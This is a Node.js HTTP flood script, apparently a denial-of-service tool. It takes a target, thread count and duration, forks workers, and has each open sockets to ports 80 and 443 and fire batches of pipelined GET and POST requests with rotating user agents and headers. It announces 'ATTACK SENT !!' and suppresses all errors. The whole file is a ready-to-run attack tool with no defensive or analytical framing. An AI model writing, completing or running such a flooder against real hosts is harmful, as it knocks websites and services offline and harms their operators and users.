const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 3) {
    console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

let userAgents = [];
userAgents = fs.readFileSync('http.txt', 'utf8').split('\n').slice(0, 15); // Limit user agents to 15

const headers = fs.readFileSync('header.txt', 'utf8').split('\n');

let ipCount = 0;
let userAgentCount = 0;

const maxIPs = 10;
const maxUserAgents = 15;

const ips = Array.from({ length: maxIPs }, (_, i) => `192.168.1.${i + 1}`);

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(` ATTACK SENT !! `);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    var int = setInterval(() => {
        if (ipCount >= maxIPs) {
            clearInterval(int);
            return;
        }

        if (userAgentCount >= maxUserAgents) {
            ipCount++;
            userAgentCount = 0;
        }

        var s = require('net').Socket();
        const port = ipCount % 2 === 0 ? 80 : 443;
        s.connect(port, host);
        s.setTimeout(10000);

        for (var i = 0; i < 64; i++) {
            const method = i % 2 === 0 ? 'GET' : 'POST';
            s.write(`${method} ${target} HTTP/1.1\r\n${headers.join('\r\n')}\r\nuser-agent: ${userAgents[userAgentCount]}\r\n\r\n`);
        }

        s.on('data', function (data) {
            console.log(data.toString()); // Reflect the received data (HTTP response) to the console
            userAgentCount++;
            setTimeout(function () {
                s.destroy();
                return delete s;
            }, 5000);
        });

    }, 1000); // Adjust the interval as needed
}
